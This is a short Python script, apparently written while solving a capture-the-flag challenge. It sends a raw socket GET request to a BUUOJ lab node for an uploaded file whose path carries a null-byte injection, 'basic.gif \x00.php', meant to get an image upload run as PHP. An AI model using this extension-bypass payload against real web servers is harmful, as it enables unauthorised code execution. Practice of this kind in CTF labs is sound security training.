def test_req_with_socket_GET():
    import socket

    def geturl(url):
        import re
        pattern = r'https?://(?P<host>.*?)(?P<port>:\d+)?(?P<path>/.*)'
        match = re.search(pattern, url)
        host = match.group('host')
        port = match.group('port')[1:] if match.group('port') else None
        path = match.group('path')
        return host, port, path

    def send_get_request(url):
        host, port, path = geturl(url)

        # 建立 TCP 连接
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((host, 29658))

        request = f"GET {path} HTTP/1.1\r\nHost: {host}\r\n\r\n"
        encoded_request = request.encode('utf-8')
        sock.send(encoded_request)
        data = sock.recv(1024)
        sock.close()
        print(data.decode('utf-8'))

    url = 'http://node4.buuoj.cn:29658/uploadfiles/basic.gif \x00.php'
    send_get_request(url)


test_req_with_socket_GET()
